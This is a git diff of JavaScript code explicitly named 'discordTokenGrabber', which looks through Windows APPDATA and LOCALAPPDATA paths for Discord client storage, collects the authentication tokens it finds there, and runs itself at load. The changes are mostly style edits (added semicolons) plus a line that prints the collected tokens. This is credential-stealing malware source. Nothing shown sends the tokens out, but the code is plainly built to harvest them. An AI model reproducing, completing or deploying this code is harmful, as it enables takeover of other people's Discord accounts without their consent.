@@ -20,7 +20,7 @@ function findToken(tokenPath) {
                     
                         if (token) {
                             token.forEach(element => {
-                                tokens.push(element) 
+                                tokens.push(element);
                             });
                         }
                     }
@@ -31,16 +31,16 @@ function findToken(tokenPath) {
     } catch {
         // console.log(`no directory found for ${tokenPath}`)
     }
-    return tokens
+    return tokens;
 }
 
 function discordTokenGrabber () {
     let paths;
-    const computerPlatform = process.platform
+    const computerPlatform = process.platform;
 
     if (computerPlatform == "win32") {
-        const local = process.env.LOCALAPPDATA
-        const roaming = process.env.APPDATA
+        const local = process.env.LOCALAPPDATA;
+        const roaming = process.env.APPDATA;
         
         paths = {
             "Discord": roaming + "\\Discord",
@@ -69,11 +69,12 @@ function discordTokenGrabber () {
         if (tokenList) {
             tokenList.forEach(token => {
                 if (tokens[platform] === undefined) tokens[platform] = []
-                tokens[platform].push(token)      
+                tokens[platform].push(token);     
             });
         }  
     }
-    return tokens
+    console.log(tokens);
+    return tokens;
 }
 
 discordTokenGrabber()
